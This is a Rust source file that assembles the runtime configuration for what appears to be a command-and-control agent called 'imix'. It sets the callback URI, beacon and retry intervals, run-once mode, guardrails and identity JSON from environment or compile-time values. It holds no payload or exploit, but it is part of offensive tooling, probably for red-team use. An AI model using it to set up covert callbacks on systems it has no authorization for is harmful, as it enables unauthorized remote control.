use pb::config::RuntimeImixConfig;

// ---- Compile-time baked values from imix/build.rs ----
// These correspond to the old `option_env!("IMIX_*")` that lived in pb/config.rs.
// They are now owned by imix and passed at runtime to pb.

const COMPILE_CALLBACK_URI: Option<&'static str> = option_env!("IMIX_CALLBACK_URI");

macro_rules! opt_env_or {
    ($var:literal, $default:literal) => {
        match option_env!($var) {
            Some(v) => v,
            None => $default,
        }
    };
}

const COMPILE_CALLBACK_INTERVAL: &str = opt_env_or!("IMIX_CALLBACK_INTERVAL", "5");
const COMPILE_RETRY_INTERVAL: &str = opt_env_or!("IMIX_RETRY_INTERVAL", "5");
const COMPILE_RUN_ONCE_BAKED: bool = option_env!("IMIX_RUN_ONCE").is_some();
const COMPILE_EXTRA: &str = opt_env_or!("IMIX_TRANSPORT_EXTRA", "");
const COMPILE_UNIQUE_JSON: Option<&'static str> = option_env!("IMIX_UNIQUE");
const COMPILE_GUARDRAILS_JSON: Option<&'static str> = option_env!("IMIX_GUARDRAILS");

/// Build the runtime config that pb should use. Called once at agent startup,
/// after init_logger() and init_crypto().
///
/// Precedence (highest first):
/// - Runtime env vars (IMIX_* set at process launch time, e.g. via inject)
/// - Compile-time baked values from imix/build.rs cargo:rustc-env
/// - Defaults (in RuntimeImixConfig / pb).
pub fn build_runtime_config() -> RuntimeImixConfig {
    // Callback URI: prefer runtime IMIX_CALLBACK_URI, then baked value, then default.
    // When IMIX_CONFIG YAML was used, imix/build.rs already baked the DSN into
    // IMIX_CALLBACK_URI rustc-env, so it appears as compile-time baked.
    let callback_uri = std::env::var("IMIX_CALLBACK_URI")
        .ok()
        .or_else(|| COMPILE_CALLBACK_URI.map(|s| s.to_string()))
        .unwrap_or_else(|| "http://127.0.0.1:8000".to_string());

    // Intervals / flags: legacy env vars are read at runtime by original code via
    // option_env! — we preserve support by checking runtime env vars.
    let callback_interval = std::env::var("IMIX_CALLBACK_INTERVAL")
        .unwrap_or_else(|_| COMPILE_CALLBACK_INTERVAL.to_string());

    let retry_interval =
        std::env::var("IMIX_RETRY_INTERVAL").unwrap_or_else(|_| COMPILE_RETRY_INTERVAL.to_string());

    let run_once = if std::env::var("IMIX_RUN_ONCE").is_ok() {
        true
    } else {
        COMPILE_RUN_ONCE_BAKED
    };

    let transport_extra = std::env::var("IMIX_TRANSPORT_EXTRA")
        .ok()
        .unwrap_or_else(|| COMPILE_EXTRA.to_string());

    // IMIX_UNIQUE / IMIX_GUARDRAILS — check runtime prefixed vars last, to support
    // legacy injection paths that set them at runtime.
    let unique_json = std::env::var("IMIX_UNIQUE")
        .ok()
        .or_else(|| COMPILE_UNIQUE_JSON.map(|s| s.to_string()))
        .or_else(|| {
            // Legacy IMIX_TRANSPORT_EXTRA_* vars contain JSON extra per transport
            // — they are handled in pb's DSN validation; leave their consumption there
            // if needed, but for UNIQUE the counterpart is just IMIX_UNIQUE.
            None
        });

    let guardrails_json = std::env::var("IMIX_GUARDRAILS")
        .ok()
        .or_else(|| COMPILE_GUARDRAILS_JSON.map(|s| s.to_string()))
        .or_else(|| None);

    // Also check IMIX_TRANSPORT_EXTRA_{N} vars for DSN validation — delegate to
    // imix/build.rs's existing validate_dsn_config at build time. At runtime we
    // don't re-validate, we just collect.

    RuntimeImixConfig {
        callback_uri,
        callback_interval,
        retry_interval,
        run_once,
        transport_extra,
        unique_json,
        guardrails_json,
    }
}
